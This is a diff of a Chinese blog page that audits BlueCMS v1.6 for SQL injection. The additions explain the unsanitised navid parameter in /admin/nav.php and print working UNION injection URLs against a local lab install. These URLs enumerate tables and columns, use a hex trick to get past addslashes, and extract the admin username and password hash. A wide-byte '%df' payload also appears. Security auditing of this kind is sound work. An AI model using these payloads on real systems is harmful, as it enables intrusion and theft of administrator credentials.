@@ -524,14 +524,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    7 分
                 </div>
                 
 				
@@ -645,7 +645,16 @@ http:<span class="token comment" spellcheck="true">//127.0.0.1/bluecms_src/uploa
 <span class="token number">23</span>行 <span class="token variable">$admin_pwd</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><pre><code>%df&#39;or 1=1 #</code></pre><p><img src="../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605090336244.png" alt></p>
 <h3 id="注入3（Union联合注入）"><a href="#注入3（Union联合注入）" class="headerlink" title="注入3（Union联合注入）"></a>注入3（Union联合注入）</h3><p><strong>注入点：</strong> <code>/admin/nav.php</code></p>
-<h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h4><p>待更。。。</p>
+<h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//63-70行</span>
+<span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span><span class="token operator">==</span><span class="token string">'edit'</span><span class="token punctuation">)</span>
+ <span class="token punctuation">{</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'navigate'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" where navid = "</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'navid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$nav</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'nav'</span><span class="token punctuation">,</span><span class="token variable">$nav</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string">'act'</span><span class="token punctuation">,</span> <span class="token variable">$act</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string">'nav_info.htm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>$_GET[&#39;navid&#39;]</code>直接接在后面，存在SQL注入漏洞</p>
 <h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#查看字段数</span>
 http:<span class="token comment" spellcheck="true">//127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&amp;navid=1 order by 6;  #正常</span>
 http:<span class="token comment" spellcheck="true">//127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&amp;navid=1 order by 7;  #报错</span>
@@ -664,7 +673,24 @@ http:<span class="token comment" spellcheck="true">//127.0.0.1/bluecms_src/uploa
 得到数据库：bluetest mysql版本：5.5.53 操作系统：Win32
 '</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="../images/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMS-v1-6/image-20200605110818109.png" alt></p>
-<p>后续查询暂时没找到方法</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">##查看表名</span>
+http:<span class="token comment" spellcheck="true">//127.0.0.1/bluecms_src/uploads/admin/nav.php?act=edit&amp;navid=1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4,5,6</span>
+<span class="token string">''</span><span class="token string">'
+得到表名：...,blue_admin,blue_admin_log,...
+'</span><span class="token string">''</span>
+
+<span class="token comment" spellcheck="true">#查看blue_admin表中字段名</span>
+<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">/</span>bluecms_src<span class="token operator">/</span>uploads<span class="token operator">/</span>admin<span class="token operator">/</span>nav<span class="token punctuation">.</span>php?act<span class="token operator">=</span>edit<span class="token operator">&amp;</span>navid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x626c75655f61646d696e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span>
+<span class="token string">''</span><span class="token string">'
+这里表名blue_admin必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
+得到字段：admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip
+'</span><span class="token string">''</span>
+
+<span class="token comment" spellcheck="true">#查看admin_name和pwd字段信息</span>
+<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">/</span>bluecms_src<span class="token operator">/</span>uploads<span class="token operator">/</span>admin<span class="token operator">/</span>nav<span class="token punctuation">.</span>php?act<span class="token operator">=</span>edit<span class="token operator">&amp;</span>navid<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>admin_name<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span> <span class="token keyword">from</span> blue_admin<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> 
+‘’‘
+得到字段信息：admin:<span class="token number">767708e8a5300bfe4e239b47b51659ff</span>
+’‘’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="注入4"><a href="#注入4" class="headerlink" title="注入4"></a>注入4</h3><p><strong>注入点：</strong> <code>/admin/ad.php</code></p>
 <h4 id="审计-3"><a href="#审计-3" class="headerlink" title="审计"></a>审计</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token number">101</span>行 <span class="token variable">$ad_id</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ad_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ad_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
 <span class="token number">106</span>行 <span class="token variable">$ad</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT ad_id, ad_name, time_set, start_time, end_time, content, exp_content FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'ad'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE ad_id="</span><span class="token punctuation">.</span><span class="token variable">$ad_id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -1450,7 +1476,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">141.6k</span>&nbsp;字
+                class="white-color">141.8k</span>&nbsp;字
             
             
             
